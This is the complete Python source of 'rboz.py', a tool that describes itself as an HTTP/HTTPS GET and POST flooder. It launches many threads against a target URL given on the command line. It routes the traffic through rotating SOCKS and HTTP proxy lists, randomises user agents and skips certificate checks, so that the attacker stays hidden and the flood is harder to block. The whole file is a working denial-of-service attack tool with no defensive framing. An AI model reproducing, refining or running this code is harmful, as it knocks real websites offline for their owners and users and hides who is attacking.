####################################################################################################################
#
# rboz.py - simple http/https get/post flooder that support both socks and http(s) proxies.
#
# https://github.com/sphinxid/rboz
#
# - Requires python 3.6+ (pysocks + raw socket)
# - Must have all proxy files on folder default/socks4, default/socks5.txt,
#   default/https.txt and default/http.txt (example format -> 1.2.3.4:8080 per line)
# - Must have web user agent files in default/useragents.txt
#
####################################################################################################################

import threading
import random
import sys
import string
import socks
import socket
import ssl
from time import sleep
from urllib.parse import urlparse

def openfile(filename):
  data = open(filename).readlines()

  return data


def getRandomUA():
  global uas

  ua = random.choice(uas).split("\n")
  ua = ua[0]

  return ua


def getRandomAccept():
  acceptall = [
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept-Encoding: gzip, deflate\r\n",
  "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
  "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
  "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xhtml+xml",
  "Accept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
  "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n",
  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\n",
  "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n",
  ]

  #return random.choice(acceptall)
  return acceptall[1]


def getProxy(run_proxy_type):
  if run_proxy_type == 'https':
    p  = random.choice(httpsproxies)
    p1 = p.split(":")
  elif run_proxy_type == 'http':
    p  = random.choice(httpproxies)
    p1 = p.split(":")
  elif run_proxy_type == 'socks5':
    p  = random.choice(socks5proxies)
    p1 = p.split(":")
  elif run_proxy_type == 'socks4':
    p  = random.choice(socks4proxies)
    p1 = p.split(":")

  ret = [ p, p1]
  return ret


def removeProxy(run_proxy_type, p):
  if p in delcache:
    return

  if run_proxy_type == 'https':
    try:
      httpsproxies.remove(p)
    except:
      pass
  if run_proxy_type == 'http':
    try:
      httpproxies.remove(p)
    except:
      pass
  if run_proxy_type == 'socks5':
    try:
      socks5proxies.remove(p)
    except:
      pass
  if run_proxy_type == 'socks4':
    try:
      socks4proxies.remove(p)
    except:
      pass
  return


def loadFiles():
  global httpsproxies
  global httpproxies
  global socks4proxies
  global socks5proxies
  global uas

  httpsproxyfile = 'default/https.txt'
  httpproxyfile = 'default/http.txt'
  socks4proxyfile = 'default/socks4.txt'
  socks5proxyfile = 'default/socks5.txt'
  uasfile = 'default/useragents.txt'

  httpsproxies = openfile(httpsproxyfile)
  httpproxies = openfile(httpproxyfile)
  socks4proxies = openfile(socks4proxyfile)
  socks5proxies = openfile(socks5proxyfile)
  uas = openfile(uasfile)

  return

def letknow(proxy, proxytype, url):
  print("Proxy: %s | %s | %s" % (proxy, proxytype, url))


##########
class GoHttpGet(threading.Thread):
  def __init__(self, counter, url, run_proxy_type):
    threading.Thread.__init__(self)
    self.counter = counter
    self.url = url
    self.run_proxy_type = run_proxy_type

  def run(self):
    ua = getRandomUA()
    myh = {'User-Agent': ua}

    pd = getProxy(self.run_proxy_type)
    sp = pd[0].strip()

    up = urlparse(self.url)
    dip = up.hostname
    fullpath = up.path
    if up.query != "":
      fullpath += '?' + up.query

    mt.wait()
    while True:
      try:
        if self.run_proxy_type == "socks4" or self.run_proxy_type == "socks5":
          ss = socks.socksocket()
          if self.run_proxy_type == "socks4":
            ss.set_proxy(socks.SOCKS4, pd[1][0], int(pd[1][1].strip()))
          else:
            ss.set_proxy(socks.SOCKS5, pd[1][0], int(pd[1][1].strip()))

          if up.scheme == "https":
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.options |= ssl.OP_NO_SSLv2
            context.options |= ssl.OP_NO_SSLv3
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ss = context.wrap_socket(ss, server_hostname=up.hostname, server_side=False)
            ss.connect((dip, 443))
          else:
            ss.connect((dip, 80))
          header1 = "GET " + fullpath + " HTTP/1.1\r\n"
          header1 += "Host: " + up.hostname + "\r\n"
          header1 += "User-Agent: " + ua + "\r\n"
          header1 += "Accept: " + getRandomAccept()
          header1 += "Connection: Keep-Alive\r\n"
          header1 += "\r\n"
          ss.send(header1.encode('utf-8'))
          ss.recv(1)
        elif self.run_proxy_type == "http":
          ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          ss.connect((pd[1][0], int(pd[1][1].strip())))

          header1 = "CONNECT " + up.hostname + " HTTP/1.1\r\n\r\n"
          ss.send(header1.encode('utf-8'))
          ss.recv(2048)

          header1 = "GET " + fullpath + " HTTP/1.1\r\n"
          header1 += "Host: " + up.hostname + "\r\n"
          header1 += "User-Agent: " + ua + "\r\n"
          header1 += "Accept: " + getRandomAccept()
          header1 += "Connection: Keep-Alive\r\n"
          header1 += "\r\n"
          ss.send(header1.encode('utf-8'))
        elif self.run_proxy_type == "https":
          ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          ss.connect((pd[1][0], int(pd[1][1].strip())))

          header1 = "CONNECT " + up.hostname + ":443 HTTP/1.1\r\n\r\n"
          ss.send(header1.encode('utf-8'))
          ss.recv(2048)

          context = ssl.SSLContext(ssl.PROTOCOL_TLS)
          context.options |= ssl.OP_NO_SSLv2
          context.options |= ssl.OP_NO_SSLv3
          context.check_hostname = False
          context.verify_mode = ssl.CERT_NONE
          ss = context.wrap_socket(ss, server_hostname=up.hostname, server_side=False)

          header1 = "GET " + fullpath + " HTTP/1.1\r\n"
          header1 += "Host: " + up.hostname + ":443\r\n"
          header1 += "User-Agent: " + ua + "\r\n"
          header1 += "Accept: " + getRandomAccept()
          header1 += "Connection: Keep-Alive\r\n"
          header1 += "\r\n"
          ss.send(header1.encode('utf-8'))

        letknow(sp, self.run_proxy_type, self.url)
        # add working proxy to the cache
        if not (pd[0] in delcache):
          delcache.append(pd[0])
        #while True:
        for z in range(30):
          try:
            sleep(0.01)
            if self.run_proxy_type == "socks4" or self.run_proxy_type == "socks5":
              ss.send(header1.encode('utf-8'))
            elif self.run_proxy_type == "http":
              ss.send(header1.encode('utf-8'))
            elif self.run_proxy_type == "https":
              ss.send(header1.encode('utf-8'))
            letknow(sp, self.run_proxy_type, self.url)
          except Exception as e:
            print("Proxy is dead.. reconnecting.")
            #removeProxy(self.run_proxy_type, pd[0])
            print(e)
            ss.close()
            pd = getProxy(self.run_proxy_type)
      except Exception as e:
        print("Proxy is dead.. reconnecting.")
        #removeProxy(self.run_proxy_type, pd[0])
        print(e)
        ss.close()
        pd = getProxy(self.run_proxy_type)

##########

##########
class GoHttpPost(threading.Thread):
  def __init__(self, counter, url, run_proxy_type):
    threading.Thread.__init__(self)
    self.counter = counter
    self.url = url
    self.run_proxy_type = run_proxy_type

  def run(self):
    ua = getRandomUA()
    myh = {'User-Agent': ua,
           "Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}

    pd = getProxy(self.run_proxy_type)
    sp = pd[0].strip()

    up = urlparse(self.url)
    dip = up.hostname
    fullpath = up.path
    if up.query != "":
      fullpath += '?' + up.query

    mt.wait()
    while True:
      try:
        letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        postdata = ''.join(random.choice(letters) for i in range(random.randint(64,128)))
        postlen = len(postdata)
        postheader = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
        postheader += "Content-Length: " + str(postlen) + "\r\n"

        if self.run_proxy_type == "socks4" or self.run_proxy_type == "socks5":
          ss = socks.socksocket()
          if self.run_proxy_type == "socks4":
            ss.set_proxy(socks.SOCKS4, pd[1][0], int(pd[1][1].strip()))
          else:
            ss.set_proxy(socks.SOCKS5, pd[1][0], int(pd[1][1].strip()))

          if up.scheme == "https":
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.options |= ssl.OP_NO_SSLv2
            context.options |= ssl.OP_NO_SSLv3
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ss = context.wrap_socket(ss, server_hostname=up.hostname, server_side=False)
            ss.connect((dip, 443))
          else:
            ss.connect((dip, 80))
          header1 = "POST " + fullpath + " HTTP/1.1\r\n"
          header1 += "Host: " + up.hostname + "\r\n"
          header1 += postdata
          header1 += "User-Agent: " + ua + "\r\n"
          header1 += "Accept: " + getRandomAccept()
          header1 += "Connection: Keep-Alive\r\n"
          header1 += "\r\n"
          ss.send(header1.encode('utf-8'))
          ss.recv(1)
        elif self.run_proxy_type == "http":
          ss = socks.socksocket()
          ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          ss.connect((pd[1][0], int(pd[1][1].strip())))

          header1 = "CONNECT " + up.hostname + " HTTP/1.1\r\n\r\n"
          ss.send(header1.encode('utf-8'))
          ss.recv(2048)

          header1 = "POST " + fullpath + " HTTP/1.1\r\n"
          header1 += "Host: " + up.hostname + "\r\n"
          header1 += postdata
          header1 += "User-Agent: " + ua + "\r\n"
          header1 += "Accept: " + getRandomAccept()
          header1 += "Connection: Keep-Alive\r\n"
          header1 += "\r\n"
          ss.send(header1.encode('utf-8'))
        elif self.run_proxy_type == "https":
          ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          ss.connect((pd[1][0], int(pd[1][1].strip())))

          header1 = "CONNECT " + up.hostname + ":443 HTTP/1.1\r\n\r\n"
          ss.send(header1.encode('utf-8'))
          ss.recv(1024)

          context = ssl.SSLContext(ssl.PROTOCOL_TLS)
          context.options |= ssl.OP_NO_SSLv2
          context.options |= ssl.OP_NO_SSLv3
          context.check_hostname = False
          context.verify_mode = ssl.CERT_NONE
          ss = context.wrap_socket(ss, server_hostname=up.hostname, server_side=False)

          header1 = "POST " + fullpath + " HTTP/1.1\r\n"
          header1 += "Host: " + up.hostname + ":443\r\n"
          header1 += postdata
          header1 += "User-Agent: " + ua + "\r\n"
          header1 += "Accept: " + getRandomAccept()
          header1 += "Connection: Keep-Alive\r\n"
          header1 += "\r\n"
          ss.send(header1.encode('utf-8'))

        letknow(sp, self.run_proxy_type, self.url)
        # add working proxy to the cache
        if not (pd[0] in delcache):
          delcache.append(pd[0])
        #while True:
        for z in range(30):
          try:
            sleep(0.01)
            if self.run_proxy_type == "socks4" or self.run_proxy_type == "socks5":
              ss.send(header1.encode('utf-8'))
            elif self.run_proxy_type == "http":
              ss.send(header1.encode('utf-8'))
            elif self.run_proxy_type == "https":
              ss.send(header1.encode('utf-8'))

            letknow(sp, self.run_proxy_type, self.url)
          except Exception as e:
            print("Proxy is dead.. reconnecting.")
            #removeProxy(self.run_proxy_type, pd[0])
            print(e)
            ss.close()
            pd = getProxy(self.run_proxy_type)
      except Exception as e:
        print("Proxy is dead.. reconnecting.")
        #removeProxy(self.run_proxy_type, pd[0])
        print(e)
        ss.close()
        pd = getProxy(self.run_proxy_type)

##########


def main():
  global httpsproxies
  global httpproxies
  global socks4proxies
  global socks5proxies
  global uas
  global mt
  global delcache

  loadFiles()
  mt = threading.Event()
  delcache = []

  proxytype = sys.argv[1]
  url = sys.argv[2]
  threads = sys.argv[3]
  httpmode = sys.argv[4]

  for i in range(int(threads)):
    if httpmode == "get":
      GoHttpGet(i+1, url, proxytype).start()
      mt.set()
    elif httpmode == "post":
      GoHttpPost(i+1, url, proxytype).start()
      mt.set()

if __name__ == '__main__':
  main()
